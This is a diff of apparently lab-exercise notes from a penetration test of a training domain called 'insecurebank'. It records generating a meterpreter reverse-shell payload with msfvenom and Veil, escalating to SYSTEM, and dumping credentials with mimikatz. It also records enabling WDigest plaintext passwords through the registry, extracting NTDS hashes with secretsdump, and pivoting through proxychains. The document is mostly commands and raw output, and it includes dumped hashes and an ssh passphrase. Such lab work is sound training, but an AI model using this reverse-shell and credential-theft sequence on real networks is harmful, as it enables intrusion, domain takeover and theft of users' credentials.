@@ -310,11 +310,12 @@ md5 reverse of '5033b55c74e5c56686f25bb6f2d21f79' == funkeymonkey124
 
 OS on the .13 machine (Tomcat + Vault) is Ubuntu 16.04 LTS
 
-*** ssh passphrase in the vault
+*** edward's ssh passphrase in the vault
 Aiwaib6s
 
-*** Menno cracked an excel file
+*** Menno cracked an excel file from (probably fred's machine)
 The encrypted excel file was using a password which also worked for KeePass
+The password was probably also Fred's password
 
 *** TODO jenkins slave - Dev Server
 http://10.59.4.14:8080/computer/dev_server/systemInfo
@@ -327,8 +328,9 @@ user.name	DEV_SERVER$
 
 *** Better notekeeping - shared notes
 *** Better oversight of getting to the goal
-*** Keep track of 
+*** Keep track of the progress
 
+* Day 2
 ** Veil evasion output
  [*] Language: powershell
  [*] Payload Module: powershell/meterpreter/rev_tcp
@@ -518,6 +520,7 @@ I managed to kill apache somehow :(
 
 Says:
 **** Apache listing
+#+BEGIN_EXAMPLE
 Access forbidden!
 
 New XAMPP security concept:
@@ -530,59 +533,29 @@ If you think this is a server error, please contact the webmaster.
 Error 403
 10.59.4.16
 Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.19 
-
+#+END_EXAMPLE
 -> Should configure httpd-xampp.conf
 
-Config file is in httpd
+Config file is in c:\xampp\apache\ somewhere (?)
 
+* Day 2 continued
 
-
-* Cobalt strike
-+ Used by APT and Red Team
-+ Has a built in C2
-+ Windows based implant
-+ Includes pivoting features
-+ Implants include mimikatz & psexec/wmiexec
-+ Used when a system is already compromised
-  * Shouldn't drop it as a first thing, go step by step, if they catch you, then you will burn your tools
-  * The main idea is to start like a script kiddie (something basic), then if it fails, go to the next weapon
-+ Can be stealthy and communicate over periodical HTTP connections
-  * Can also run interactively, but that creates more noise
-+ Has a team server
-+ Beacons can proxy other beacons for less noise on the perimeter
-  * For example the domain controller may not have internet connection
-  * Can use named pipes / SMB to talk to each other
-  * SMB chaining
-+ Different ways to deliver
-+ can add targets manually / from nmap outputs
-+ scanning
-+ ticket functionality
-  * steal live kerberos tickets
-  * create tickets using compromised accounts credentials
-  * this is very difficult to detect (pass the ticket)
-+ Tunneling
-  * SOCKS proxy
-  * Covert VPN
-+ SLEEP Scripting language
-+ Establishing persistence is key
-+ demo:
-  * can generate a payload, host it and supply a one-liner to download it
-  * can generate various versions - macro, stageless, etc
-
-
+** getting Bob's credentials
 
 **** mimikatz 
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.59.4.101 LPORT=443 
+~msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.59.4.101 LPORT=443~ 
 
-** TODO look at the credential guard and flaws
+*** TODO look at the credential guard and flaws
 
 generated new reverse shell with:
+#+BEGIN_EXAMPLE
 veil
 use 29)	python/shellcode_inject/aes_encrypt.py
 generate
 shellcode: 2 (msfvenom)
 set up LHOST and LPORT
-- didn't work
+#+END_EXAMPLE
+- this one didn't work - as it didn't connect back to me
 
 generated new reverse shell with
 veil
@@ -596,6 +569,7 @@ now in meterpreter I got system ~getsystem~, then I loaded mimikatz - ~load mimi
 running mimikatz, executed ~msv~
 
 **** msv output on .16
+#+BEGIN_EXAMPLE
 [*] Retrieving msv credentials
 msv credentials
 ===============
@@ -609,15 +583,16 @@ AuthID     Package    Domain          User           Password
 0;997      Negotiate  NT AUTHORITY    LOCAL SERVICE  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
 0;30430    NTLM                                      mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
 0;999      Negotiate  insecurebank    INTRANET$      mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
+#+END_EXAMPLE
 
-*Looks like we could get bob's credentials*
++ *Looks like we couldn't get bob's credentials now*
 
-I should migrate to a 64-bit process
-- see.exe is shown as x86
++ This error indicates I should migrate to a 64-bit process
+- ~see.exe~ (my reverse shell binary) is shown as x86 - let's find a suitable x64 process
 
 **** ps output
 meterpreter > ps
-
+#+BEGIN_EXAMPLE
 Process List
 ============
 
@@ -687,12 +662,14 @@ Process List
  15108  14936  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
  15180  14936  powershell.exe        x86   0        INTRANET\Administrator        c:\windows\syswow64\windowspowershell\v1.0\powershell.exe
  15232  14712  see.exe               x86   0        INTRANET\Administrator        C:\xampp\see.exe
+#+END_EXAMPLE
 
-**** migrating to a process
+**** migrating to a 64-bit process
 
 migrate 5724
 
 then credentials:
+#+BEGIN_EXAMPLE
 kerberos credentials
 ====================
 
@@ -705,8 +682,10 @@ AuthID     Package    Domain          User           Password
 0;1584398  Negotiate  Window Manager  DWM-2          96 53 64 a4 e5 87 dc f8 c1 81 dd 0b 84 c0 8a 64 c9 4e 76 5a 73 79 63 d4 8f 4f 14 8e cd 5c ba 8e 50 32 9f 59 59 90 0f da 2a 55 eb 23 7d 33 0f 77 4a 97 6c ce 65 5d 68 43 f6 10 a8 3c 45 33 c7 79 19 c0 c5 3f 1e 69 79 04 e2 96 71 0e 38 5e 3c 67 bb 75 2f e4 54 f0 1b 67 98 1c 25 83 8d 1c 17 ad df 09 b1 c1 f3 84 e3 a8 78 2c 88 b1 07 f8 12 6a c2 c1 a5 44 7a 4e 72 f0 88 97 64 9d 61 9b b3 9c f2 ff 84 30 58 2f 71 e3 d7 bb b7 6c fe 35 89 8d cb bc fd 0f d9 cf f8 09 68 6b 41 c4 0e 71 71 96 1e 9f 41 60 39 34 85 39 2a f8 fb 15 be 35 48 16 32 22 b8 56 b9 ed 81 5a 54 a1 66 74 f1 72 89 89 1a ae 88 c8 82 a7 8a e7 48 69 44 de d9 c5 f4 86 4b 64 82 75 e9 37 07 80 75 47 fd bb 44 57 9a 19 28 83 a3 d3 ab c9 15 24 fd bb 6e f7 5b 35 c9 b9 
 0;51773    Negotiate  Window Manager  DWM-1          96 53 64 a4 e5 87 dc f8 c1 81 dd 0b 84 c0 8a 64 c9 4e 76 5a 73 79 63 d4 8f 4f 14 8e cd 5c ba 8e 50 32 9f 59 59 90 0f da 2a 55 eb 23 7d 33 0f 77 4a 97 6c ce 65 5d 68 43 f6 10 a8 3c 45 33 c7 79 19 c0 c5 3f 1e 69 79 04 e2 96 71 0e 38 5e 3c 67 bb 75 2f e4 54 f0 1b 67 98 1c 25 83 8d 1c 17 ad df 09 b1 c1 f3 84 e3 a8 78 2c 88 b1 07 f8 12 6a c2 c1 a5 44 7a 4e 72 f0 88 97 64 9d 61 9b b3 9c f2 ff 84 30 58 2f 71 e3 d7 bb b7 6c fe 35 89 8d cb bc fd 0f d9 cf f8 09 68 6b 41 c4 0e 71 71 96 1e 9f 41 60 39 34 85 39 2a f8 fb 15 be 35 48 16 32 22 b8 56 b9 ed 81 5a 54 a1 66 74 f1 72 89 89 1a ae 88 c8 82 a7 8a e7 48 69 44 de d9 c5 f4 86 4b 64 82 75 e9 37 07 80 75 47 fd bb 44 57 9a 19 28 83 a3 d3 ab c9 15 24 fd bb 6e f7 5b 35 c9 b9 
 0;999      Negotiate  insecurebank    INTRANET$      96 53 64 a4 e5 87 dc f8 c1 81 dd 0b 84 c0 8a 64 c9 4e 76 5a 73 79 63 d4 8f 4f 14 8e cd 5c ba 8e 50 32 9f 59 59 90 0f da 2a 55 eb 23 7d 33 0f 77 4a 97 6c ce 65 5d 68 43 f6 10 a8 3c 45 33 c7 79 19 c0 c5 3f 1e 69 79 04 e2 96 71 0e 38 5e 3c 67 bb 75 2f e4 54 f0 1b 67 98 1c 25 83 8d 1c 17 ad df 09 b1 c1 f3 84 e3 a8 78 2c 88 b1 07 f8 12 6a c2 c1 a5 44 7a 4e 72 f0 88 97 64 9d 61 9b b3 9c f2 ff 84 30 58 2f 71 e3 d7 bb b7 6c fe 35 89 8d cb bc fd 0f d9 cf f8 09 68 6b 41 c4 0e 71 71 96 1e 9f 41 60 39 34 85 39 2a f8 fb 15 be 35 48 16 32 22 b8 56 b9 ed 81 5a 54 a1 66 74 f1 72 89 89 1a ae 88 c8 82 a7 8a e7 48 69 44 de d9 c5 f4 86 4b 64 82 75 e9 37 07 80 75 47 fd bb 44 57 9a 19 28 83 a3 d3 ab c9 15 24 fd bb 6e f7 5b 35 c9 b9 
+#+END_EXAMPLE
 
-msv credentials
++msv credentials
+#+BEGIN_EXAMPLE
 meterpreter > mimikatz_command -f sekurlsa::msv
 "0;88329138","Negotiate","Administrator","INTRANET","n.a. (msv1_0 KO)"
 "0;1802806","Kerberos","bob","insecurebank","n.a. (msv1_0 KO)"
@@ -716,10 +695,12 @@ meterpreter > mimikatz_command -f sekurlsa::msv
 "0;997","Negotiate","LOCAL SERVICE","NT AUTHORITY","n.a. (msv1_0 KO)"
 "0;30430","NTLM","","","n.a. (msv1_0 KO)"
 "0;999","Negotiate","INTRANET$","insecurebank","n.a. (msv1_0 KO)"
+#+END_EXAMPLE
 
++ Note: bob seems to be a domain admin 
+  * we can find this with running ~net user bob /domain~
++ Note: Domain admins should not be allowed to log in to workstations to reduce attack surface
 
-bob seems to be a domain admin
-Domain admins should not be allowed to log in to admins
 
 *** getting the address of the domain controller
 
@@ -738,13 +719,17 @@ Auto config URL :
 Proxy URL       : http://10.59.6.11:80
 Proxy Bypass    : 
 
-Attempted to change the wdigest setting on 
+*** Changing the WDigest settings so we can see plaintext credentials
+
++ Attempted to change the wdigest setting on 
 https://www.trustedsec.com/2015/04/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/
 
 meterpreter > reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -d 1 
 Successfully set UseLogonCredential of REG_SZ
 
 NOTE: now we should need to get bob to reconnect to be able to grab credentials
+
++ this was done by the facilitator, but still couldn't see the credentials
 
 Windows 2012 R2 x64 (build 9600) en_US 
 
@@ -753,9 +738,10 @@ Windows 2012 R2 x64 (build 9600) en_US
 kerberos mimikatz 
 https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos
 
--> I could be using an old version of mimikatz
+**** Was told by the facilitator that this could be caused by using an old version of mimikatz
+Mimikatz included in meterpreter is version *1.0*, there is version *2.x* available on github
 
-** Bob's password
+** Obtained Bob's password
 	wdigest :	
 	 * Username : bob
 	 * Domain   : insecurebank
@@ -763,7 +749,7 @@ https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos
 
 Path: 
 + logged in via meterpreter
-+ Uploaded newer version of mimikatz (binary from github) 
++ Uploaded *newer version of mimikatz* (binary from github) 
   * The one built into meterpreter was 1.0 and couldn't get digest passwords
 + executed new mimikatz binary
 + sekurlsa::logonPasswords
@@ -807,6 +793,7 @@ root@kali:~/Downloads/11-dc# impacket-secretsdump -system system -ntds ntds.dit 
 
 *** ntds dump
 *] Reading and decrypting hashes from ntds.dit 
+#+BEGIN_EXAMPLE
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:16df1e2f1ee258ed53b3a514abd4978a:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DC1$:1004:aad3b435b51404eeaad3b435b51404ee:2ae949c82d64da279a76c069f4b86584:::
@@ -890,7 +877,7 @@ ALICE$:aes256-cts-hmac-sha1-96:95c62f827b475e1dbdae3ccb865045e34b389a5b1f489c8f1
 ALICE$:aes128-cts-hmac-sha1-96:83cf03a0ee49aacd692f38b3e3835cdc
 ALICE$:des-cbc-md5:0eb3b51a7062518c
 ALICE$:rc4_hmac:77323c8c3b906ad620e1b6cd34217e76
-
+#+END_EXAMPLE
 
 *** going to the machine with 3 NICs
 
@@ -1016,8 +1003,107 @@ https://www.offensive-security.com/metasploit-unleashed/proxytunnels/
 + now we should be able to run external tools through the tunnel:
   * ~proxychains nmap -sV 10.59.3.14~
 + Alternative way to set up route:
-  * use multi/manage/autoroute
-  * set SESSION 1
-  * set SUBNET 10.59.3.0
-  * run
-  * NOTE: needed to change the command from ~add auto~ to ~add~
+  #+BEGIN_SRC
+  use multi/manage/autoroute
+  set SESSION 1
+  run
+  #+END_SRC
+  * this added routes to .3.0 and .5.0
++ now we can use the proxy:
+  * proxychains ssh -i prod.key edward@10.59.3.14
+
+**** edwards's pass phrase? 
+Aiwaib6s
+
+*** How to verify ssh pass phrase for a private key:
++ ssh-add prod.key 
+
+**** output from ssh -v (verbose) attempt to connect to .3.13
+#+BEGIN_EXAMPLE
+root@kali:~/Downloads/24-edward# proxychains ssh -v -i prod.key edward@10.59.3.13
+ProxyChains-3.1 (http://proxychains.sf.net)
+OpenSSH_7.9p1 Debian-10, OpenSSL 1.1.1c  28 May 2019
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: Applying options for *
+debug1: Connecting to 10.59.3.13 [10.59.3.13] port 22.
+|S-chain|-<>-127.0.0.1:1080-<><>-10.59.3.13:22-<><>-OK
+debug1: Connection established.
+debug1: identity file prod.key type -1
+debug1: identity file prod.key-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_7.9p1 Debian-10
+debug1: Remote protocol version 2.0, remote software version OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
+debug1: match: OpenSSH_7.2p2 Ubuntu-4ubuntu2.4 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002
+debug1: Authenticating to 10.59.3.13:22 as 'edward'
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: curve25519-sha256@libssh.org
+debug1: kex: host key algorithm: ecdsa-sha2-nistp256
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: Server host key: ecdsa-sha2-nistp256 SHA256:pLR+rhlSzT0Fb/k08g5+augz/h2piFxJI7EOuwhPHS0
+debug1: Host '10.59.3.13' is known and matches the ECDSA host key.
+debug1: Found key in /root/.ssh/known_hosts:4
+debug1: rekey after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey after 134217728 blocks
+debug1: Will attempt key: prod.key RSA SHA256:5GETVRKPZss40Guzm2n21qLoWhxUufKK5+paRR+Mmuw agent
+debug1: Will attempt key: root@kali RSA SHA256:GwhRVP34Ii0JKqCGw/ityelMswrL1iTMtHUlFpODcSc agent
+debug1: Will attempt key: prod.key  explicit
+debug1: SSH2_MSG_EXT_INFO received
+debug1: kex_input_ext_info: server-sig-algs=<rsa-sha2-256,rsa-sha2-512>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: password
+debug1: Next authentication method: password
+edward@10.59.3.13's password: 
+#+END_EXAMPLE
+
+**** ssh output from .3.11 is the only one that asks for a passphrase
+#+BEGIN_EXAMPLE
+root@kali:~/Downloads/24-edward# proxychains ssh -v -i prod.key edward@10.59.3.11
+ProxyChains-3.1 (http://proxychains.sf.net)
+OpenSSH_7.9p1 Debian-10, OpenSSL 1.1.1c  28 May 2019
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: Applying options for *
+debug1: Connecting to 10.59.3.11 [10.59.3.11] port 22.
+|S-chain|-<>-127.0.0.1:1080-<><>-10.59.3.11:22-<><>-OK
+debug1: Connection established.
+debug1: identity file prod.key type -1
+debug1: identity file prod.key-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_7.9p1 Debian-10
+debug1: Remote protocol version 2.0, remote software version OpenSSH_6.7p1 Debian-5+deb8u4
+debug1: match: OpenSSH_6.7p1 Debian-5+deb8u4 pat OpenSSH* compat 0x04000000
+debug1: Authenticating to 10.59.3.11:22 as 'edward'
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: curve25519-sha256@libssh.org
+debug1: kex: host key algorithm: ecdsa-sha2-nistp256
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: Server host key: ecdsa-sha2-nistp256 SHA256:S+pRkyHMlrreSawjPmyZphkzKDxG9yBCY54Zhrh4fZE
+debug1: Host '10.59.3.11' is known and matches the ECDSA host key.
+debug1: Found key in /root/.ssh/known_hosts:3
+debug1: rekey after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey after 134217728 blocks
+debug1: Will attempt key: prod.key RSA SHA256:5GETVRKPZss40Guzm2n21qLoWhxUufKK5+paRR+Mmuw agent
+debug1: Will attempt key: root@kali RSA SHA256:GwhRVP34Ii0JKqCGw/ityelMswrL1iTMtHUlFpODcSc agent
+debug1: Will attempt key: prod.key  explicit
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: publickey
+debug1: Offering public key: prod.key RSA SHA256:5GETVRKPZss40Guzm2n21qLoWhxUufKK5+paRR+Mmuw agent
+debug1: Authentications that can continue: publickey,password
+debug1: Offering public key: root@kali RSA SHA256:GwhRVP34Ii0JKqCGw/ityelMswrL1iTMtHUlFpODcSc agent
+debug1: Authentications that can continue: publickey,password
+debug1: Trying private key: prod.key
+Enter passphrase for key 'prod.key': 
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: password
+edward@10.59.3.11's password: 
+#+END_EXAMPLE
